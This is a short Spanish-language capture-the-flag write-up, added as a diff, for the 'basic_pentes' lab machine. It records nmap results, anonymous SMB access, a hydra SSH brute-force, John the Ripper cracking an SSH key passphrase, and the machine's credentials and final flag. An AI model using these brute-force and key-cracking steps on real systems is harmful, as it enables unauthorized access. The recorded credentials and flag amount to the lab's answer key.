@@ -1,0 +1,63 @@
+maquina: basic_pentes
+
+rta nmap:
+la maquina corre
+PORT		SERVICE			VERSION
+22/TCP		SSH			OpenSSH 7.2P2
+80/TCP		HTTP			APACHE HTTPD 2.4.18
+139/TCP		NETBIOS-SSH		SAMBA SMBD 3.X
+445/TCP					SAMBA SMBD 4.3.11
+8009/TCP	AJP13			APCHE JSERV
+
+Dir found: / - 200
+Dir found: /development/ - 200
+File found: /development/dev.txt - 200
+File found: /development/j.txt - 200
+
+
+
+en notas de web/development
+
+ versión 2.5.12 de smb
+
+smbclient //ip/anonymous
+
+usuarios
+kay
+jan
+
+
+resultado hydra -l jam rockyou.txt ip ssh
+
+[22][ssh] host: 10.10.92.247   login: jan   password: armando
+
+data ssh rsa
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCzAsDwjb0ft4IO7Kyux8DWocNiS1aJqpdVEo+gfk8Ng624b9qOQp7LOWDMVIINfCuzkTA3ZugSyo1OehPc0iyD7SfJIMzsETFvlHB3DlLLeNFm11hNeUBCF4Lt6o9uH3lcTuPVyZAvbAt7xD66bKjyEUy3hrpSnruN+M0exdSjaV54PI9TBFkUmmqpXsrWzMj1QaxBxZMq3xaBxTsFvW2nEx0rPOrnltQM4bdAvmvSXtuxLw6e5iCaAy1eoTHw0N6IfeGvwcHXIlCT25gH1gRfS0/NdR9cs78ylxYTLDnNvkxL1J3cVzVHJ/ZfOOWOCK4iJ/K8PIbSnYsBkSnrIlDX27PM7DZCBu+xhIwV5z4hRwwZZG5VcU+nDZZYr4xtpPbQcIQWYjVwr5vF3vehk57ymIWLwNqU/rSnZ0wZH8MURhVFaNOdr/0184Z1dJZ34u3NbIBxEV9XsjAh/L52Dt7DNHWqUJKIL1/NV96LKDqHKCXCRFBOh9BgqJUIAXoDdWLtBunFKu/tgCz0n7SIPSZDxJDhF4StAhFbGCHP9NIMvB890FjJE/vys/PuY3efX1GjTdAijRa019M2f8d0OnJpktNwCIMxEjvKyGQKGPLtTS8o0UAgLfV50Zuhg7H5j6RAJoSgFOtlosnFzwNuxxU05ozHuJ59wsmn5LMK97sbow== I don't have to type a long password anymore!
+
+
+resultado johntheripper al id_rsa
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 4 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+Proceeding with incremental:ASCII
+beeswax          (id_rsa)     
+1g 0:00:05:38 DONE 3/3 (2023-06-03 02:24) 0.002955g/s 5735Kp/s 5735Kc/s 5735KC/s beelkul..beeswin
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+------------------------------
+ por ssh nos conectamos kay@ip con id_rsa		#el id_rsa hay que quitarles los privilegios 777 y dejarlso en 600
+usamos la pass beeswax
+leemos el archivo pass_bak
+nos da la ultima flag
+
+heresareallystrongpasswordthatfollowsthepasswordpolicy$$
+
+maquina terminada
+
